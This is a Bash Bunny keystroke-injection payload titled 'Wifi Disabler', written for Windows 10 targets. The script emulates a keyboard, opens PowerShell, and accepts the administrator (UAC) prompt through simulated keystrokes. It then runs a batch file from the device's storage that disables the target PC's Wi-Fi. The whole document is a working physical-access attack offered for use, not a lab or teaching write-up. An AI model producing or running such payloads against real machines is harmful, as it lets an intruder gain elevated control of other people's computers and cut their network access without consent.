#!/bin/bash
#
# Title:         Wifi Disabler
# Author:        JeffParkerModHD
# Version:       1.0
# Target:        Tested on Windows 10
#
# This is a script that will disable the target PCs wi-fi...

GET SWITCH_POSITION
LED R
ATTACKMODE HID STORAGE
Q DELAY 100
Q GUI
Q DELAY 300
Q STRING powershell
Q DELAY 100
Q CTRL-SHIFT ENTER
Q DELAY 500
Q LEFTARROW
Q DELAY 200
Q ENTER
Q DELAY 300
Q STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\nowifi.bat')"
Q DELAY 100
Q ENTER
LED G
